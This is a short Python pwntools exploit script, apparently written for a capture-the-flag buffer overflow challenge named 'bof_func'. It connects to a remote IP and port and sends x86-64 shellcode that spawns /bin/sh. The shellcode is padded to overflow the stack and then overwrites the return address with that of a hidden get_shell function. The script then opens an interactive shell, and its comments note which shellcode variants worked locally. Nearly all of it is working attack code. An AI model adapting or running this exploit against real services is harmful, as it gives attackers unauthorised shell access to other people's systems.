from pwn import *

context.log_level='debug'

# p = process('./bof_func')
p = remote('141.164.48.98', '30002')

# df80 work on local machine
# address = 0x7fffffffdf80

# the get_shell hides in this program!
address = 0x4006b7

# This work on df80 (with python + gdb), but not on (only gdb)
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# This not work. why?
# shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'

payload = shellcode
payload += b'B' * (0x140 - len(payload))

payload += address.to_bytes(8, 'little')
payload += address.to_bytes(8, 'little')

# pause()
p.sendline(payload)

with open("bof_func_payload.txt", "wb") as f:
    f.write(payload)

p.interactive()
